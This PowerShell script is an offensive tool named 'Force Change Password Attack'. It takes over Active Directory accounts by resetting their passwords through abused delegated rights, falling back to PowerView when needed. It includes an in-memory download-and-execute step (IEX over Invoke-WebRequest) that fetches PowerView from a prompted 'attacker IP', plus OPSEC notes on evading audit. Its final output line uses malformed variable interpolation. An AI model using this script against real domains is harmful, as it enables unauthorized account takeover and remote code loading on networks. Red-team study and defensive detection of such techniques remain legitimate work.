<#
.SYNOPSIS
    Resets the password of a specified Active Directory user and optionally
    forces the user to change the password at next logon.

.DESCRIPTION
    This script attempts to reset a domain user's password using two methods:

      1. Native ActiveDirectory module (Set-ADAccountPassword)
      2. PowerView fallback (Set-DomainUserPassword)

    If the native AD method fails (e.g., module not present or insufficient
    rights), the script falls back to PowerView using alternate credentials.

    The operation relies on delegated permissions such as:
      - Reset Password
      - GenericAll
      - ForceChangePassword

    No vulnerabilities are exploited; this is a post-exploitation technique
    leveraging legitimate Active Directory permissions.

.PARAMETER TargetUser
    The target domain user (sAMAccountName or distinguished name) whose
    password will be reset.

.PARAMETER NewPassword
    The new plaintext password to assign to the target user.

.PARAMETER Domain
    The Active Directory domain name.
    Defaults to the current user's domain.

.PARAMETER AltUsername
    Optional alternate domain username used for the PowerView fallback
    when the current context lacks permission.

.PARAMETER AltPassword
    Plaintext password for the alternate domain user.

.PARAMETER ForceChangeAtLogon
    If specified, sets the ChangePasswordAtLogon flag so the user must
    change their password at the next interactive logon.

.EXAMPLE
    PS C:\> .\ForceChangePassword.ps1 `
            -TargetUser andy `
            -NewPassword 'TempPass!123'

    Resets the password for user 'andy' using the current security context.

.EXAMPLE
    PS C:\> .\ForceChangePassword.ps1 `
            -TargetUser andy `
            -NewPassword 'TempPass!123' `
            -AltUsername svc-helpdesk `
            -AltPassword 'Helpdesk!2024' `
            -ForceChangeAtLogon

    Resets the password using delegated helpdesk credentials and forces
    the user to change their password at next logon.

.OUTPUTS
    Displays the new credentials on success.
    No objects are returned.

.NOTES
    Author: Scuba-Steev3
    Requires: ActiveDirectory module or PowerView.ps1
    Technique: Password Reset via Delegated AD Permissions
    OPSEC:
      - Password resets generate Security Event ID 4724
      - ChangePasswordAtLogon is auditable
      - Use cautiously in monitored environments

.LINK
    https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4724
    https://github.com/PowerShellMafia/PowerSploit
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUser,

    [Parameter(Mandatory = $true)]
    [string]$NewPassword,

    [string]$Domain = $env:USERDOMAIN,

    # Optional alternate creds for PowerView fallback
    [string]$AltUsername,
    [string]$AltPassword,

    [switch]$ForceChangeAtLogon
)

# Usage: .\ForceChangePassword.ps1 `
#         -TargetUser andy `
#         -NewPassword 'TempPass!123' `
#         -AltUsername svc-helpdesk `
#         -AltPassword 'Helpdesk!2024' `
#         -ForceChangeAtLogon

Write-Host "[*] Force Change Password Attack" -ForegroundColor Cyan
Write-Host "[*] Target User : $TargetUser"
Write-Host "[*] Domain      : $Domain"
Write-Host

$SecurePassword = ConvertTo-SecureString $NewPassword -AsPlainText -Force
$PasswordReset  = $false

########################################
# Helper: Import PowerView (TL;DR prompts)
########################################
function Import-PowerView {

    # Check if already loaded
    if (Get-Command Set-DomainUserPassword -ErrorAction SilentlyContinue) {
        Write-Host "[+] PowerView already loaded" -ForegroundColor Green
        return $true
    }

    # Attempt local import
    if (Test-Path ".\PowerView.ps1") {
        Write-Host "[*] Attempting local PowerView import (.\\PowerView.ps1)"

        try {
            Import-Module .\PowerView.ps1 -ErrorAction Stop
        } catch {
            Write-Warning "Local Import-Module failed"
        }

        if (Get-Command Set-DomainUserPassword -ErrorAction SilentlyContinue) {
            Write-Host "[+] PowerView loaded from local file" -ForegroundColor Green
            return $true
        }
    }

    # TL;DR fallback — in-memory download
    Write-Warning "PowerView not loaded/on host"
    Write-Host  "[*] Provide IP and port to load PowerView in-memory" -ForegroundColor Yellow

    $IP   = Read-Host "Enter attacker IP hosting PowerView.ps1"
    $Port = Read-Host "Enter port (e.g. 8000)"

    if (-not $IP -or -not $Port) {
        Write-Error "IP/Port not provided — cannot load PowerView"
        return $false
    }

    $URL = "http://${IP}:${Port}/PowerView.ps1"
    Write-Host "[*] Loading PowerView from $URL"

    try {
        IEX (Invoke-WebRequest -UseBasicParsing -Uri $URL)
        
        Import-Module .\PowerView.ps1 -ErrorAction Stop
        
        if (Get-Command Set-DomainUserPassword -ErrorAction SilentlyContinue) {
            Write-Host "[+] PowerView loaded in-memory" -ForegroundColor Green
            return $true
        } else {
            throw "PowerView functions not available after import"
        }
    }
    catch {
        Write-Error "Failed to load PowerView: $_"
        return $false
    }
}

########################################
# Attempt 1: Native ActiveDirectory Cmdlet
########################################
try {
    Write-Host "Importing ActiveDirectory Module..."
    Import-Module ActiveDirectory -ErrorAction Stop

    Write-Host "[*] Using current security context ($($env:USERNAME))"
    Write-Host "    Attempting to Reset Password for $($TargetUser)... ";
    Set-ADAccountPassword -Identity $TargetUser -NewPassword $SecurePassword -Reset -ErrorAction Stop;

    Write-Host "[+] Password reset using Set-ADAccountPassword" -ForegroundColor Green;
    $PasswordReset = $true
}
catch {
    Write-Warning "Native AD method failed — attempting PowerView fallback"
}


########################################
# Attempt 2: PowerView Fallback
########################################
if (-not $PasswordReset) {
    Write-Host ""
    Write-Host "Retrying with PowerView..."
    
    if (-not (Import-PowerView)) {
        exit 1
    }

    if ($AltUsername -and $AltPassword) {
        $CredPassword = ConvertTo-SecureString $AltPassword -AsPlainText -Force;
        $Cred = New-Object System.Management.Automation.PSCredential (
            "$Domain\$AltUsername", $CredPassword
        )
    } else {
        Write-Error "Alternate credentials required for PowerView fallback (-AltUsername / -AltPassword)"
        exit 1
    }

    try {
        Write-Host "Attempting to Reset Password for $($TargetUser)... "
        Set-DomainUserPassword -Identity $TargetUser -AccountPassword $SecurePassword -Credential $Cred;

        Write-Host "[+] Password reset using Set-DomainUserPassword (PowerView)" -ForegroundColor Green;
        $PasswordReset = $true
    }
    catch {
        Write-Error "PowerView password reset failed — insufficient privileges"
        exit 1
    }
}

########################################
# Force Change at Logon (Optional)
########################################
if ($PasswordReset -and $ForceChangeAtLogon) {
    try {
        Write-Host "Attempting to set ChangePasswordAtLogon Flag for $($TargetUser)... "
        
        Import-Module ActiveDirectory -ErrorAction SilentlyContinue
        Set-ADUser -Identity $TargetUser -ChangePasswordAtLogon $true;
        Write-Host "[+] User forced to change password at next logon";
    }
    catch {
        Write-Warning "Could not set ChangePasswordAtLogon flag"
    }
}

########################################
# Output Result
########################################
if ($PasswordReset) {
    Write-Host
    Write-Host "[*] New credentials:" -ForegroundColor Yellow
    Write-Host "    ${$Domain}\${$TargetUser} : ${$NewPassword}"
}
